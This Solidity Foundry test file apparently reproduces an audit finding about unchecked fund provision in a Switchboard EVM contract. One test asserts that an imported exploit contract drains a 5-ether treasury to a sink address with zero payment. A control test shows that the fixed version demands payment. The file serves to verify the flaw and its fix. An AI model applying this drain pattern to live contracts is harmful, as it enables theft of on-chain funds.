// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, SbFunctionFixed} from "./47981-unchecked-fund-provision-ottersec-none-switchboard-evm-pdf.sol";

contract UncheckedFundProvisionTest is Test {
    address internal constant SINK = 0x0000000000000000000000000000000000000eE1;
    uint256 internal constant N = 5 ether;

    function test_exploit_creditsSinkWithZeroPaid() public {
        Exploit e = new Exploit();
        vm.deal(address(e.sb()), N);
        uint256 sinkBefore = SINK.balance;

        e.run();

        assertEq(e.paid(), 0, "caller paid");
        assertEq(e.credited(), N, "credited");
        assertEq(SINK.balance - sinkBefore, N, "sink balance");
        assertEq(address(e.sb()).balance, 0, "treasury left");
        assertEq(e.sb().lastSent(), N, "sent value");
    }

    function test_control_requiresThePayment() public {
        SbFunctionFixed fixedFn = new SbFunctionFixed();
        vm.deal(address(fixedFn), N);
        vm.deal(address(this), N);

        SbFunctionFixed.Transaction[] memory txs = new SbFunctionFixed.Transaction[](1);
        txs[0] = SbFunctionFixed.Transaction({to: SINK, value: N, data: "", from: SINK});
        bytes[] memory signatures = new bytes[](1);

        vm.expectRevert(bytes("payment required"));
        fixedFn.forward(txs, signatures);
        assertEq(address(fixedFn).balance, N, "unpaid call drained the treasury");
        assertEq(SINK.balance, 0, "unpaid call credited the sink");

        fixedFn.forward{value: N}(txs, signatures);
        assertEq(SINK.balance, N, "paid call did not credit N");
        assertEq(address(fixedFn).balance, N, "paid call spent the pre-existing treasury");
    }
}
